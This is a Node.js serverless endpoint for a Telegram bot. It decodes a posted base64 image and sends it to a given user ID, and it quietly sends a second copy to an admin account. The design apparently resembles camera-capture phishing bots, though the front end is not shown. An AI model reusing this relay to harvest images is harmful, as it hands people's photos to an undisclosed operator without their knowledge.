const { Telegraf } = require('telegraf');
const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  try {
    const { image, uid } = req.body;
    const adminId = process.env.ADMIN_ID;

    if (!uid || !image) {
      return res.status(400).send('❌ UID or image missing');
    }

    const base64 = image.replace(/^data:image\/\w+;base64,/, '');
    const imgBuffer = Buffer.from(base64, 'base64');

    const caption = `🖼️ *New Image Received!*\n\n👤 *User ID:* \`${uid}\`\n🕒 *Time:* \`${new Date().toLocaleString("en-US", { timeZone: "Asia/Kabul" })}\`\n\n🧑🏻‍💻 Built By: *WACIQ*`;

    // Send to user
    await bot.telegram.sendPhoto(uid, { source: imgBuffer }, {
      caption,
      parse_mode: 'Markdown'
    });

    // Send to admin
    await bot.telegram.sendPhoto(adminId, { source: imgBuffer }, {
      caption,
      parse_mode: 'Markdown'
    });

    res.status(200).send('✅ Image delivered');
  } catch (err) {
    console.error("❌ Image send error:", err);
    res.status(500).send('❌ Sending error');
  }
}; 
